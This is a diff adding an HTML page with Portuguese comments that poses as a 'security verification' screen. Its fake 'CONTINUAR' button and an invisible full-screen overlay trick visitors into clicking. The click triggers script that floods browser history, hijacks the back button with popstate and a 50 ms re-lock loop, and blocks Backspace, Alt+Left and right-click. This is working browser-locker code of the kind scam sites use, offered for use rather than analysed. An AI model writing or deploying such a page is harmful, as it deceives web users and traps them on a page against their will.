@@ -1,0 +1,136 @@
+
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificação de Segurança</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #ffffff;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+
+        /* Container de Indução */
+        #induction-container {
+            text-align: center;
+            cursor: pointer;
+            user-select: none;
+            transition: opacity 0.3s;
+        }
+
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        h1 {
+            font-size: 18px;
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        p {
+            font-size: 14px;
+            color: #666;
+        }
+
+        /* Botão falso para induzir o clique */
+        .btn-fake {
+            display: inline-block;
+            margin-top: 20px;
+            padding: 10px 25px;
+            background-color: #007bff;
+            color: white;
+            border-radius: 5px;
+            font-weight: bold;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+
+        /* Camada invisível que cobre tudo */
+        #interaction-layer {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            z-index: 9999;
+            background: rgba(255, 255, 255, 0);
+            cursor: pointer;
+        }
+        
+        /* Estado após o clique (volta a ficar totalmente branco) */
+        .hidden {
+            display: none !important;
+        }
+    </style>
+</head>
+<body>
+    <div id="interaction-layer"></div>
+    
+    <div id="induction-container">
+        <div class="spinner"></div>
+        <h1>Verificando sua conexão...</h1>
+        <p>Clique no botão abaixo para continuar</p>
+        <div class="btn-fake">CONTINUAR</div>
+    </div>
+
+    <script>
+        const lockURL = window.location.href;
+        const layer = document.getElementById('interaction-layer');
+        const container = document.getElementById('induction-container');
+
+        function activateUltraLock() {
+            // 1. Inunda o histórico massivamente (100 estados)
+            for (let i = 0; i < 100; i++) {
+                window.history.pushState({ locked: true, id: i }, "", lockURL + "#" + Math.random().toString(36).substring(7));
+            }
+            
+            // 2. Esconde os elementos de indução para voltar ao fundo branco solicitado
+            container.classList.add('hidden');
+            document.body.style.backgroundColor = "#ffffff";
+
+            // 3. Re-bloqueia no evento de popstate
+            window.onpopstate = function() {
+                window.history.pushState(null, "", lockURL + "#" + Date.now());
+                window.location.replace(lockURL + "#locked");
+            };
+
+            // 4. Reforço contínuo
+            setInterval(() => {
+                window.history.pushState(null, "", lockURL + "#re-lock-" + Date.now());
+            }, 50);
+        }
+
+        // Captura o clique em qualquer lugar da tela
+        layer.addEventListener('click', function() {
+            activateUltraLock();
+            this.style.pointerEvents = 'none'; // Desativa a camada para não interferir
+        });
+
+        // Bloqueios adicionais de segurança
+        window.addEventListener('keydown', e => {
+            if (e.keyCode === 8 || (e.altKey && e.keyCode === 37)) e.preventDefault();
+        });
+        document.addEventListener('contextmenu', e => e.preventDefault());
+    </script>
+</body>
+</html>
